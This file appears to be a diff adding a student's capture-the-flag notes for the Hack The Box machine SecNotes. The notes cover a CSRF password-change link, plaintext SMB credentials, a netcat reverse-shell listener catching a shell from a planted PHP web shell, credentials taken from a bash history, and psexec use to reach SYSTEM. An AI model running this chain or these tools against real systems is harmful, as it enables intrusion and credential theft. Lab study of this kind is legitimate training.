@@ -1,0 +1,127 @@
+
+
+
+
+
+
+We take the request at the bottom of the captured request,
+stick it on the end of the url we obtained if from with an added ?
+and change P
+
+/change_pass.php?password=soprano&confirm_password=soprano&submit=submit
+
+We send this link to the contact form.
+
+\\secnotes.htb\new-site
+tyler / 92g!mA8BGjOirkL%OG*&
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444       
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.97] 53736
+ls
+
+
+    Directory: C:\inetpub\new-site
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        8/29/2025  11:55 PM                Microsoft                                                             
+-a----        6/21/2018   8:26 AM            696 iisstart.htm                                                          
+-a----        6/21/2018   8:26 AM          98757 iisstart.png                                                          
+-a----        8/29/2025  11:51 PM             38 smbphpshell.php                                                       
+
+
+PS C:\inetpub\new-site> cd C:\
+PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        6/21/2018   3:07 PM                Distros                                                               
+d-----        6/21/2018   6:47 PM                inetpub                                                               
+d-----        6/22/2018   2:09 PM                Microsoft                                                             
+d-----        4/11/2018   4:38 PM                PerfLogs                                                              
+d-----        6/21/2018   8:15 AM                php7                                                                  
+d-r---        1/26/2021   2:39 AM                Program Files                                                         
+d-r---        1/26/2021   2:38 AM                Program Files (x86)                                                   
+d-r---        6/21/2018   3:00 PM                Users                                                                 
+d-----        1/26/2021   2:38 AM                Windows                                                               
+-a----        6/21/2018   3:07 PM      201749452 Ubuntu.zip                                                            
+
+
+PS C:\> 
+PS C:\> Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss
+
+
+    Hive: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss
+
+
+Name                           Property                                                                                
+----                           --------                                                                                
+{02893575-609c-4e3b-a426-00f9d State             : 1                                                                   
+9b271da}                       DistributionName  : Ubuntu-18.04                                                        
+                               Version           : 1                                                                   
+                               BasePath          : C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18
+                               .04onWindows_79rhkp1fndgsc\Loca                                                         
+                                                   lState                                                              
+                               PackageFamilyName : CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc            
+
+
+PS C:\> 
+PS C:\> type C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root\.bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+> .bash_history 
+less .bash_history
+exit
+PS C:\> 
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-psexec secnotes/administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.97.....
+[*] Found writable share ADMIN$
+[*] Uploading file okKHlIza.exe
+[*] Opening SVCManager on 10.10.10.97.....
+[*] Creating service TRgt on 10.10.10.97.....
+[*] Starting service TRgt.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32> whoami
+nt authority\system
+
+C:\WINDOWS\system32> 
+
+
+
+
+
+
+
+
